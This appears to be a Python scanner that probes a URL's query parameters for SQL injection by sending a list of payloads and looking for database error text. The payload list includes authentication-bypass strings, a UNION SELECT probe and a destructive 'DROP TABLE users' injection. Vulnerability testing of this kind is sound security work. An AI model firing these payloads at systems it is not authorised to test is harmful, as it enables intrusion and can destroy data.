import requests

def test_sql_injection(url: str, params: dict) -> list[str]:
    payloads = ["' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users;--", "' UNION SELECT 1,2,3--"]
    findings = []
    base = requests.get(url, params=params, timeout=10).text

    for key in params:
        for p in payloads:
            test_params = {**params, key: p}
            try:
                r = requests.get(url, params=test_params, timeout=10)
                if r.text != base and any(
                    e in r.text.lower() for e in
                    ["sql", "syntax", "mysql", "oracle", "postgresql", "sqlite", "unrecognized"]
                ):
                    findings.append(f"{key}={p!r} → {r.status_code}")
            except requests.RequestException:
                pass
    return findings
